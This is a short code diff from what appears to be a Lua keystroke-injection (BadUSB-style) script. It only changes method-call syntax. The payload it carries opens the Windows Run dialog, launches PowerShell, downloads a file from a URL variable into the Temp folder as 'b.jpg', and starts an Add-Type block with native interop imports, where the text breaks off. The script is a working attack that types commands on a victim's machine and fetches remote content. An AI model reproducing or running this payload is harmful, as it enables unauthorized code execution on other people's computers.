@@ -21,11 +21,11 @@ while true do
     print("running")
     wait(1000)
 
-    kb.chord(MOD_LSUPER, KEY_R)
+    kb:chord(MOD_LSUPER, KEY_R)
     wait(2000)
-    kb.string("powershell\n")
+    kb:string("powershell\n")
     wait(2000)
-    kb.string("[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ..
+    kb:string("[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ..
             "(new-object System.Net.WebClient).DownloadFile('" .. file .. "',\"$Env:Temp\\b.jpg\");\n" ..
             "Add-Type @\"\n" ..
             "using System;using System.Runtime.InteropServices;using Microsoft.Win32;namespa" ..
